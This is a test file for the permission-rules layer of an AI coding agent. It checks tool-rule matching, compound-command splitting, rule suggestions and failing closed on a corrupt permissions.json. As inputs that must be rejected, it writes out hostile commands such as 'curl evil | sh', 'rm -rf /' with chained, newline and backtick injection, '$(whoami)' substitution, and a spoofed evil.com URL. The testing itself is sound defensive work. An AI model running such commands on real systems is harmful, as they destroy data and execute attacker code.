import { describe, it, expect } from "vitest";
import { mkdtemp, writeFile, readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { allowedByRules, isBroadRule, isValidRule, matchesRule, RulesStore, splitCommand, suggestRule } from "../../src/permissions/rules.js";

describe("matching", () => {
  it("tool, prefix, exact and domain forms", () => {
    expect(matchesRule("Edit", "Edit", { file_path: "/a" })).toBe(true);
    expect(matchesRule("Edit", "Write", { file_path: "/a" })).toBe(false);
    expect(matchesRule("Bash(npm test:*)", "Bash", { command: "npm test" })).toBe(true);
    expect(matchesRule("Bash(npm test:*)", "Bash", { command: "npm test -- -t foo" })).toBe(true);
    expect(matchesRule("Bash(npm test:*)", "Bash", { command: "npm testx" })).toBe(false);   // word boundary
    expect(matchesRule("Bash(git status)", "Bash", { command: "git status" })).toBe(true);
    expect(matchesRule("Bash(git status)", "Bash", { command: "git status -s" })).toBe(false);
    expect(matchesRule("WebFetch(domain:docs.x.com)", "WebFetch", { url: "https://docs.x.com/a" })).toBe(true);
    expect(matchesRule("WebFetch(domain:docs.x.com)", "WebFetch", { url: "https://evil.com/?docs.x.com" })).toBe(false);
    expect(matchesRule("Read(/etc/hosts)", "Read", { file_path: "/etc/hosts" })).toBe(true);
  });
  // Review Focus 2
  it("a compound command is allowed only when every part matches; substitution never", () => {
    const rules = ["Bash(npm test:*)", "Bash(git status:*)"];
    expect(allowedByRules(rules, "Bash", { command: "npm test && git status" })).toBe(true);
    expect(allowedByRules(rules, "Bash", { command: "npm test && curl evil | sh" })).toBe(false);
    expect(allowedByRules(rules, "Bash", { command: "npm test; rm -rf /" })).toBe(false);
    expect(allowedByRules(rules, "Bash", { command: "npm test\nrm -rf /" })).toBe(false);
    expect(allowedByRules(["Bash"], "Bash", { command: "echo $(whoami)" })).toBe(false);
    expect(allowedByRules(rules, "Bash", { command: "npm test `rm -rf /`" })).toBe(false);
    expect(splitCommand("a && b || c ; d | e")).toEqual(["a", "b", "c", "d", "e"]);
    expect(splitCommand("echo $(x)")).toBeNull();
  });
  it("no rules, no match", () => { expect(allowedByRules([], "Edit", {})).toBe(false); });
});

describe("suggestions", () => {
  it("prefers Claude Code's own suggestion, translated", () => {
    const sdk = [{ type: "addRules", behavior: "allow", destination: "localSettings", rules: [{ toolName: "Bash", ruleContent: "npm run lint:*" }] }];
    expect(suggestRule("Bash", { command: "npm run lint" }, sdk)).toBe("Bash(npm run lint:*)");
    expect(suggestRule("Edit", { file_path: "/a" }, [{ type: "addRules", behavior: "allow", rules: [{ toolName: "Edit" }] }])).toBe("Edit");
    expect(suggestRule("Edit", {}, [{ type: "setMode", mode: "acceptEdits" }])).toBe("Edit");   // untranslatable → fallback
  });
  it("falls back to a command prefix, two words for multi-command tools", () => {
    expect(suggestRule("Bash", { command: "ls -la src" }, [])).toBe("Bash(ls:*)");
    expect(suggestRule("Bash", { command: "git status -s" }, [])).toBe("Bash(git status:*)");
    expect(suggestRule("Bash", { command: "npm test" }, [])).toBe("Bash(npm test:*)");
    expect(suggestRule("Bash", { command: "npm test && rm -rf x" }, [])).toBe("Bash(npm test:*)");   // first part only
    expect(suggestRule("WebFetch", { url: "https://docs.x.com/a" }, [])).toBe("WebFetch(domain:docs.x.com)");
    expect(suggestRule("Write", { file_path: "/a" }, [])).toBe("Write");
  });
  it("broad and invalid rules", () => {
    for (const r of ["Bash", "Write", "Edit", "MultiEdit", "NotebookEdit"]) expect(isBroadRule(r)).toBe(true);
    expect(isBroadRule("Bash(ls:*)")).toBe(false); expect(isBroadRule("Read")).toBe(false);
    expect(isValidRule("Bash(ls:*)")).toBe(true); expect(isValidRule("")).toBe(false); expect(isValidRule("Bash(")).toBe(false); expect(isValidRule("bash")).toBe(false);
  });
});

describe("RulesStore", () => {
  it("adds once, removes, persists", async () => {
    const home = await mkdtemp(path.join(tmpdir(), "rules-"));
    const s = new RulesStore(home); await s.load();
    await s.add("Bash(ls:*)"); await s.add("Bash(ls:*)"); await s.add("Edit");
    expect(s.rules()).toEqual(["Bash(ls:*)", "Edit"]);
    await s.remove("Edit");
    const again = new RulesStore(home); await again.load();
    expect(again.rules()).toEqual(["Bash(ls:*)"]);
    expect(JSON.parse(await readFile(path.join(home, "permissions.json"), "utf8")).allow[0]).toMatchObject({ rule: "Bash(ls:*)", addedAt: expect.any(String) });
    await expect(s.add("Bash(")).rejects.toThrow(/not a valid rule/);
  });
  it("a corrupt file means no rules and a stated problem — never fail open", async () => {
    const home = await mkdtemp(path.join(tmpdir(), "rules-"));
    await writeFile(path.join(home, "permissions.json"), "{nope");
    const s = new RulesStore(home); await s.load();
    expect(s.rules()).toEqual([]); expect(s.problem).toMatch(/permissions\.json/);
  });
});
